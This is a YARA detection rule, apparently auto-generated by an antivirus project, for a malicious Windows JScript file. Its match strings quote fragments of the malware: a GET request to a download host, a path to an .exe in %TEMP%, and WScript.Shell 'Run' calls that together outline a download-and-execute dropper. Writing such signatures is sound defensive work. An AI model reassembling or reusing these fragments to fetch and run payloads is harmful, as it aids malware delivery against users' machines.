rule sig_20160329_637cc254b440198f662dea61e01e3a7d {
  meta:
    description = "datamaliciousorder - file 20160329_637cc254b440198f662dea61e01e3a7d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d7d17d3b81087fe10c57e667d3e5b1c57aa28e62838955bf42586d683e2abeb5"

  strings:
    $s1  = "function YL() {return r[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Rxl5He1QbYjll.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[A](f() * 11); if (F[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "F[C0](\"GET\", \"http://kingsstaging.consines.in/l9osaw\", false);" fullword ascii
    $s4  = "var r = function dn() {return WScript[ov](\"WScript.Shell\");}(), Jr = 11;" fullword ascii
    $s5  = "function qg(im, c){x = x * 1; return im - c;};" fullword ascii
    $s6  = "function wc(){return \"\" + MC;};" fullword ascii
    $s7  = "function C(HF){r[\"Run\"](HF, x, x);};" fullword ascii
    $s8  = "function bo() {return ((aR == true) && (aR == W0)) ? 1 : x;};" fullword ascii
    $s9  = "function d()" fullword ascii
    $s10 = "var V = new this[\"Date\"]();" fullword ascii
    $s11 = "return qg(S, lP);" fullword ascii
    $s12 = "function f(){return 22;};" fullword ascii
    $s13 = " while (kq){" fullword ascii
    $s14 = "function Y(q) {var O = (1, 2, 3, 4, 5, q); return O;};" fullword ascii
    $s15 = "function e(){return ov;};" fullword ascii
    $s16 = "var W0 = false;" fullword ascii
    $s17 = "W0 = true; " fullword ascii
    $s18 = "var sH = false;" fullword ascii
    $s19 = "var aR = false;" fullword ascii
    $s20 = "aR = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}